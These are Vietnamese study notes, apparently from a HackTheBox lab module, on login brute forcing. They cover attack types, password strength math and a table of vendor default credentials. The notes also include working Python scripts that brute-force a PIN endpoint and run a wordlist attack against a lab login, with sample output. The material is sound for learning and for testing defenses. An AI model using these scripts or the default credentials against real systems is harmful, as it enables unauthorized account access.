---
hidden: true
---

# Login Brute Forcing

## Brute Forcing

### Introduction

Keys và passwords là cơ chế bảo vệ cơ bản trong thế giới số. Khi một attacker thử mọi tổ hợp có thể cho đến khi tìm được tổ hợp đúng, đó là brute forcing.

### What is Brute Forcing?

Brute forcing trong cybersecurity là phương pháp trial-and-error dùng để crack passwords, login credentials hoặc encryption keys bằng cách thử tuần tự các tổ hợp cho đến khi tìm ra kết quả chính xác.

Có thể hình dung nó như việc thử từng chìa khóa trong một chùm chìa cho đến khi mở được ổ khóa.

Brute force attack thành công hay không phụ thuộc vào các yếu tố chính sau:

* Độ phức tạp của password hoặc key
* Computational power của attacker
* Security measures như account lockout, CAPTCHA và các cơ chế phòng vệ khác

### How Brute Forcing Works

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Quy trình brute force thường diễn ra như sau:

* Start: Attacker khởi tạo quá trình brute force bằng tool hoặc specialized software
* Generate Possible Combination: Hệ thống sinh ra một tổ hợp password hoặc key theo character set và độ dài xác định
* Apply Combination: Tổ hợp được thử vào target system, ví dụ login form hoặc encrypted file
* Check if Successful: Hệ thống kiểm tra tổ hợp có đúng hay không
* Access Granted: Nếu đúng, attacker có được unauthorized access
* End: Nếu chưa đúng, quá trình tiếp tục lặp lại

### Types of Brute Forcing

Brute forcing gồm nhiều kỹ thuật khác nhau. Mỗi kỹ thuật có đặc điểm và use case riêng.

| Method                  | Description                                                                                                              | Example                                                                                                | Best Used When...                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------- |
| Simple Brute Force      | Thử toàn bộ các tổ hợp ký tự có thể trong một character set và length range xác định.                                    | Thử mọi tổ hợp lowercase letters từ `a` đến `z` cho passwords dài từ 4 đến 6 ký tự.                    | Khi không có thông tin trước về password và có đủ computational resources.   |
| Dictionary Attack       | Sử dụng danh sách có sẵn gồm các từ, cụm từ và passwords phổ biến.                                                       | Dùng wordlist như `rockyou.txt` để thử trên login form.                                                | Khi target có khả năng dùng weak password hoặc password dễ đoán.             |
| Hybrid Attack           | Kết hợp simple brute force và dictionary attack, thường bằng cách thêm ký tự vào đầu hoặc cuối từ trong dictionary.      | Thêm numbers hoặc special characters vào cuối các từ trong dictionary list.                            | Khi target có thể dùng biến thể của common password.                         |
| Credential Stuffing     | Dùng leaked credentials từ một service để thử trên các service khác, dựa trên giả định người dùng tái sử dụng passwords. | Dùng danh sách usernames và passwords bị lộ từ data breach để thử đăng nhập vào nhiều online accounts. | Khi có sẵn leaked credentials và nghi ngờ target tái sử dụng passwords.      |
| Password Spraying       | Thử một số commonly used passwords trên nhiều usernames khác nhau.                                                       | Thử `password123` hoặc `qwerty` trên toàn bộ usernames trong một organization.                         | Khi có account lockout policies và attacker muốn giảm khả năng bị phát hiện. |
| Rainbow Table Attack    | Dùng các bảng pre-computed password hashes để reverse hashes nhanh hơn.                                                  | So sánh captured hashes với rainbow tables để tìm plaintext password tương ứng.                        | Khi cần crack nhiều password hashes và có đủ storage.                        |
| Reverse Brute Force     | Dùng một password cố định để thử trên nhiều usernames.                                                                   | Dùng một leaked password để thử đăng nhập vào nhiều accounts khác nhau.                                | Khi nghi ngờ một password cụ thể đang được tái sử dụng trên nhiều accounts.  |
| Distributed Brute Force | Phân tán workload brute force trên nhiều computers hoặc devices để tăng tốc độ thử.                                      | Dùng cluster để tăng số tổ hợp có thể thử mỗi giây.                                                    | Khi password hoặc key quá phức tạp để một máy đơn lẻ xử lý hiệu quả.         |

### The Role of Brute Forcing in Penetration Testing

Trong penetration testing, brute forcing là kỹ thuật dùng để đánh giá độ mạnh của password-based authentication mechanisms và khả năng chống chịu của hệ thống trước password attacks.

Brute forcing thường được sử dụng khi:

* Các hướng tấn công khác không hiệu quả
* Password policies yếu, dễ dẫn đến weak passwords
* Cần nhắm vào specific accounts, đặc biệt là accounts có elevated privileges

### Note ngắn để ghi nhớ

* Brute forcing là kỹ thuật thử nhiều tổ hợp cho đến khi tìm được kết quả đúng
* Hiệu quả tấn công phụ thuộc vào password complexity, computational power và security controls
* Các biến thể phổ biến gồm dictionary attack, hybrid attack, credential stuffing, password spraying
* Trong pentest, brute forcing giúp đánh giá password policy và authentication controls



### Password Security Fundamentals

Hiệu quả của brute-force attacks phụ thuộc trực tiếp vào độ mạnh của passwords mà nó nhắm tới. Vì vậy, hiểu password security fundamentals là điều cần thiết để đánh giá đúng rủi ro và tác động thực tế của brute forcing.

### The Importance of Strong Passwords

Passwords là tuyến phòng thủ đầu tiên để bảo vệ sensitive information và systems. Một strong password tạo ra rào cản lớn hơn đáng kể, khiến attacker khó giành được unauthorized access thông qua brute forcing hoặc các kỹ thuật khác. Password càng dài và càng khó đoán thì thời gian và tài nguyên cần để compromise càng tăng lên.

### The Anatomy of a Strong Password

Theo hướng dẫn của NIST, một strong password nên có các đặc điểm sau:

* Length: Password càng dài càng tốt. Mốc tối thiểu nên là 12 ký tự, và dài hơn vẫn tốt hơn
* Complexity: Có thể kết hợp uppercase letters, lowercase letters, numbers và symbols để mở rộng không gian tổ hợp
* Uniqueness: Mỗi account nên có một password riêng, không reuse
* Randomness: Tránh dictionary words, personal information và common phrases để giảm khả năng bị đoán hoặc bị đánh trúng bởi wordlists

### Common Password Weaknesses

Nhiều users vẫn sử dụng passwords yếu hoặc có tính dự đoán cao. Đây là các điểm yếu phổ biến nhất:

* Short Passwords: Password ngắn có ít tổ hợp hơn nên dễ bị brute-force hơn
* Common Words and Phrases: Dễ bị đánh trúng bởi dictionary attacks
* Personal Information: Dễ bị suy đoán từ social media hoặc nguồn công khai
* Reusing Passwords: Làm tăng tác động dây chuyền nếu một account bị compromise
* Predictable Patterns: Các mẫu như `qwerty`, `123456`, `p@ssw0rd` rất quen thuộc với attackers

### Password Policies

Organizations thường dùng password policies để buộc users tạo strong passwords. Các policy này thường quy định:

* Minimum Length
* Complexity requirements
* Password Expiration
* Password History

Password policies có thể cải thiện mức độ an toàn, nhưng nếu thiết kế không hợp lý, chúng cũng có thể làm users hình thành thói quen xấu như ghi password ra ngoài hoặc chỉ thay đổi rất nhẹ password cũ. Vì vậy cần cân bằng giữa security và usability.

### The Perils of Default Credentials

Default passwords là một trong những rủi ro phổ biến nhưng rất dễ bị xem nhẹ. Đây là các passwords được thiết lập sẵn trên devices, software hoặc online services, thường đơn giản và dễ đoán. Với attacker, đây là dạng low-hanging fruit vì có thể giúp rút ngắn đáng kể search space hoặc thậm chí cho phép truy cập mà gần như không cần brute force đầy đủ.

| Device/Manufacturer  | Default Username | Default Password | Device Type                  |
| -------------------- | ---------------- | ---------------- | ---------------------------- |
| Linksys Router       | admin            | admin            | Wireless Router              |
| D-Link Router        | admin            | admin            | Wireless Router              |
| Netgear Router       | admin            | password         | Wireless Router              |
| TP-Link Router       | admin            | admin            | Wireless Router              |
| Cisco Router         | cisco            | cisco            | Network Router               |
| Asus Router          | admin            | admin            | Wireless Router              |
| Belkin Router        | admin            | password         | Wireless Router              |
| Zyxel Router         | admin            | 1234             | Wireless Router              |
| Samsung SmartCam     | admin            | 4321             | IP Camera                    |
| Hikvision DVR        | admin            | 12345            | Digital Video Recorder (DVR) |
| Axis IP Camera       | root             | pass             | IP Camera                    |
| Ubiquiti UniFi AP    | ubnt             | ubnt             | Wireless Access Point        |
| Canon Printer        | admin            | admin            | Network Printer              |
| Honeywell Thermostat | admin            | 1234             | Smart Thermostat             |
| Panasonic DVR        | admin            | 12345            | Digital Video Recorder (DVR) |

Bên cạnh default passwords, default usernames cũng là một vấn đề lớn. Các usernames như `admin`, `root` hoặc `user` thường được công khai trong documentation hoặc có sẵn trên Internet. Khi username đã biết trước, attacker chỉ còn phải tập trung vào password, làm giảm đáng kể effort cần thiết cho brute-force attack.

### Brute-forcing and Password Security

Trong brute-force scenario, độ mạnh của target password chính là rào cản chính đối với attacker. Với pentester, việc hiểu password quality không chỉ giúp dự đoán khả năng thành công của attack mà còn giúp chọn đúng chiến lược và phân bổ tài nguyên hợp lý.

Các góc nhìn quan trọng gồm:

* Evaluating System Vulnerability: Password policies yếu hoặc không tồn tại làm tăng xác suất brute-force thành công
* Strategic Tool Selection: Weak passwords có thể chỉ cần dictionary attack, trong khi stronger passwords có thể đòi hỏi hybrid approach hoặc kỹ thuật phức tạp hơn
* Resource Allocation: Thời gian và computational power cần thiết phụ thuộc mạnh vào password complexity
* Exploiting Weak Points: Default passwords thường là Achilles' heel và có thể trở thành entry point rất nhanh vào target network

### Key Takeaways

* Brute forcing là kỹ thuật thử nhiều tổ hợp cho đến khi tìm được kết quả đúng
* Hiệu quả của brute-force attack phụ thuộc vào password strength, computational power và security controls
* Các biến thể phổ biến gồm dictionary attack, hybrid attack, credential stuffing, password spraying và distributed brute force
* Password security là yếu tố cốt lõi quyết định mức độ khó của brute-force attack
* Default credentials là một trong những điểm yếu dễ khai thác nhất trong thực tế



### Brute Force Attacks

Để hiểu rõ mức độ khó của brute forcing, cần nắm phần toán học phía sau quá trình này. Số lượng tổ hợp có thể thử được xác định bởi công thức sau:

`Possible Combinations = Character Set Size^Password Length`

Ví dụ, một password 6 ký tự chỉ dùng lowercase letters sẽ có `26^6` tổ hợp. Nếu tăng lên 8 ký tự, số tổ hợp sẽ thành `26^8`. Khi bổ sung uppercase letters, numbers và symbols, search space sẽ tăng theo cấp số nhân.

Điểm quan trọng là chỉ cần tăng nhẹ password length hoặc mở rộng character set, attacker đã phải thử nhiều tổ hợp hơn rất nhiều. Điều này làm brute-force attack tốn thời gian và tài nguyên hơn đáng kể.

| Scenario                | Password Length | Character Set                                         | Possible Combinations                 |
| ----------------------- | --------------- | ----------------------------------------------------- | ------------------------------------- |
| Short and Simple        | 6               | Lowercase letters (`a-z`)                             | `26^6 = 308,915,776`                  |
| Longer but Still Simple | 8               | Lowercase letters (`a-z`)                             | `26^8 = 208,827,064,576`              |
| Adding Complexity       | 8               | Lowercase and uppercase letters (`a-z`, `A-Z`)        | `52^8 = 53,459,728,531,456`           |
| Maximum Complexity      | 12              | Lowercase and uppercase letters, numbers, and symbols | `94^12 = 475,920,493,781,698,549,504` |

### The Impact of Computational Power

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Thời gian để crack một password không chỉ phụ thuộc vào search space mà còn phụ thuộc trực tiếp vào computational power mà attacker có thể sử dụng. Hardware càng mạnh thì số lượng password guesses mỗi giây càng lớn.

Một password phức tạp có thể mất nhiều năm để brute-force trên một máy đơn lẻ, nhưng với distributed resources hoặc high-performance computing, khoảng thời gian đó có thể giảm đi đáng kể.

So sánh điển hình:

* Basic Computer, khoảng 1 million passwords mỗi giây: Có thể crack simple passwords khá nhanh, nhưng trở nên rất chậm với passwords phức tạp
* Supercomputer, khoảng 1 trillion passwords mỗi giây: Giảm mạnh cracking time với passwords đơn giản hơn, nhưng vẫn mất thời gian cực lớn với passwords có độ phức tạp cao

Ví dụ trong tài liệu:

* Một 8-character password dùng letters và digits có thể mất khoảng 6.92 years trên basic computer
* Một 12-character password dùng toàn bộ ASCII characters vẫn có thể mất khoảng 15000 years ngay cả với supercomputer

### Cracking the PIN

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break

```

```bash
23senku@htb[/htb]$ python pin-solver.py

...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

Phần lab minh họa một target system tạo ngẫu nhiên một 4-digit PIN và cung cấp endpoint `/pin`, nơi PIN được gửi qua query parameter. Nếu PIN đúng, hệ thống trả về success message cùng flag; nếu sai, hệ thống trả về error message.

Về bản chất, đây là một ví dụ đơn giản để minh họa brute-force attack trên không gian tìm kiếm nhỏ. Với 4-digit PIN, attacker chỉ cần thử từ `0000` đến `9999`, tức tổng cộng 10000 khả năng.

Quy trình trong demo:

* Tạo lần lượt từng PIN từ `0000` đến `9999`
* Gửi request đến endpoint `/pin`
* Kiểm tra response để xác định khi nào hệ thống trả về kết quả thành công
* Dừng lại khi tìm được correct PIN và thu được flag

Ý nghĩa của ví dụ này là cho thấy khi search space nhỏ và không có cơ chế phòng vệ phù hợp, brute forcing có thể rất hiệu quả. Đây cũng là lý do các cơ chế như rate limiting, account lockout, monitoring và MFA có vai trò rất quan trọng trong thực tế.

### Key Takeaways from This Section

* Search space của password tăng theo cấp số nhân dựa trên password length và character set size
* Password length và complexity càng cao thì brute-forcing càng khó
* Computational power có thể rút ngắn cracking time đáng kể, nhưng không loại bỏ hoàn toàn độ khó của strong passwords
* Các giá trị ngắn như 4-digit PIN có search space nhỏ nên đặc biệt dễ bị brute force nếu thiếu security controls
* Trong thực tế, khả năng chống brute force không chỉ dựa vào password strength mà còn dựa vào defensive controls ở tầng ứng dụng và hệ thống



### Dictionary Attacks

Trong khi brute-force approach có tính toàn diện, nó thường tốn nhiều thời gian và tài nguyên, đặc biệt khi phải xử lý complex passwords. Đó là lý do dictionary attacks được sử dụng như một cách tiếp cận hiệu quả hơn trong nhiều tình huống thực tế.

### The Power of Words

Hiệu quả của dictionary attack đến từ việc khai thác xu hướng phổ biến của con người: ưu tiên passwords dễ nhớ thay vì passwords an toàn. Nhiều người vẫn chọn passwords dựa trên dictionary words, common phrases, names hoặc các patterns dễ đoán, và điều đó khiến họ trở thành mục tiêu phù hợp cho dictionary attacks.

Thành công của dictionary attack phụ thuộc mạnh vào chất lượng và mức độ phù hợp của wordlist. Wordlist càng sát với thói quen đặt password của target thì xác suất compromise càng cao. Ví dụ, nếu target là một hệ thống được dùng nhiều bởi gamers, một wordlist chứa gaming terminology sẽ hiệu quả hơn nhiều so với dictionary thông thường.

Về bản chất, dictionary attack dựa trên việc hiểu human psychology và common password practices. Thay vì thử toàn bộ search space như brute force, attacker tập trung vào các passwords có xác suất xuất hiện cao nhất.

### Brute Force vs. Dictionary Attack

Khác biệt cốt lõi giữa brute-force attack và dictionary attack nằm ở cách tạo password candidates. Brute force thử toàn bộ các tổ hợp có thể trong một phạm vi xác định, còn dictionary attack dùng một danh sách passwords đã được chuẩn bị sẵn để thu hẹp search space.

| Feature       | Dictionary Attack                                            | Brute Force Attack                                          | Explanation                                                                                                        |
| ------------- | ------------------------------------------------------------ | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| Efficiency    | Nhanh hơn và tiết kiệm tài nguyên hơn đáng kể                | Có thể rất tốn thời gian và tài nguyên                      | Dictionary attack dùng wordlist có sẵn nên thu hẹp search space rõ rệt                                             |
| Targeting     | Có thể tùy biến theo target hoặc system cụ thể               | Không có khả năng targeting nội tại                         | Wordlist có thể chứa company name, employee names hoặc dữ liệu liên quan đến target                                |
| Effectiveness | Rất hiệu quả với weak passwords hoặc commonly used passwords | Hiệu quả với mọi password nếu có đủ thời gian và tài nguyên | Nếu password nằm trong dictionary, attacker có thể tìm thấy rất nhanh                                              |
| Limitations   | Kém hiệu quả với complex, randomly generated passwords       | Thường không thực tế với passwords dài hoặc quá phức tạp    | Random password thường không xuất hiện trong wordlist, còn brute force thì bị giới hạn bởi số lượng tổ hợp cực lớn |

Một ví dụ điển hình là khi attacker nhắm vào employee login portal của một công ty. Trong trường hợp đó, attacker có thể xây dựng wordlist chuyên biệt gồm các common weak passwords, company name, tên nhân viên, tên phòng ban và industry-specific jargon để tăng khả năng thành công so với brute-force thuần túy.

### Building and Utilizing Wordlists

Wordlists có thể được lấy hoặc xây dựng từ nhiều nguồn khác nhau, tùy theo mục tiêu và bối cảnh của cuộc tấn công.

* Publicly Available Lists: Các wordlists công khai trên Internet, bao gồm common passwords, leaked credentials từ data breaches và các bộ dữ liệu tương tự
* Custom-Built Lists: Wordlists tự xây dựng từ thông tin thu thập trong giai đoạn reconnaissance
* Specialized Lists: Wordlists tối ưu cho một ngành, một ứng dụng hoặc một công ty cụ thể
* Pre-existing Lists: Các wordlists đi kèm sẵn trong tools, frameworks hoặc pentest distributions như ParrotSec

Dưới đây là một số wordlists hữu ích cho login brute-forcing:

| Wordlist                                    | Description                                                                           | Typical Use                                    | Source                 |
| ------------------------------------------- | ------------------------------------------------------------------------------------- | ---------------------------------------------- | ---------------------- |
| `rockyou.txt`                               | Password wordlist nổi tiếng chứa hàng triệu passwords bị lộ từ RockYou breach         | Dùng phổ biến cho password brute force attacks | RockYou breach dataset |
| `top-usernames-shortlist.txt`               | Danh sách ngắn các usernames phổ biến nhất                                            | Phù hợp cho thử username nhanh                 | SecLists               |
| `xato-net-10-million-usernames.txt`         | Danh sách 10 triệu usernames                                                          | Dùng cho username brute forcing kỹ hơn         | SecLists               |
| `2023-200_most_used_passwords.txt`          | Danh sách 200 passwords được dùng nhiều nhất năm 2023                                 | Phù hợp để thử reused passwords phổ biến       | SecLists               |
| `Default-Credentials/default-passwords.txt` | Danh sách default usernames và passwords thường gặp trên routers, software và devices | Hữu ích khi thử default credentials            | SecLists               |

### Throwing a Dictionary at the Problem

Phần lab minh họa một dictionary attack bằng Python script. Script sẽ tải một wordlist các weak passwords phổ biến, sau đó gửi từng password đến endpoint `/dictionary` bằng POST request để kiểm tra xem password nào đúng.

Giữ nguyên script để có thể copy và chạy trực tiếp:

```
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Script này thực hiện 4 bước chính:

* Downloads the Wordlist: Tải wordlist gồm 500 commonly used passwords từ SecLists
* Iterates and Submits Passwords: Lần lượt gửi từng password đến `/dictionary` endpoint
* Analyzes Responses: Kiểm tra response status code và nội dung JSON để phát hiện khi login thành công
* Continues or Terminates: Tiếp tục thử cho đến khi tìm được correct password hoặc hết wordlist

Output mẫu trong lab:

```
23senku@htb[/htb]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```

Output cho thấy tiến trình dictionary attack diễn ra tuần tự theo từng password trong wordlist. Khi gặp đúng password, script in ra password tương ứng và flag, từ đó xác nhận quá trình brute forcing đã thành công.



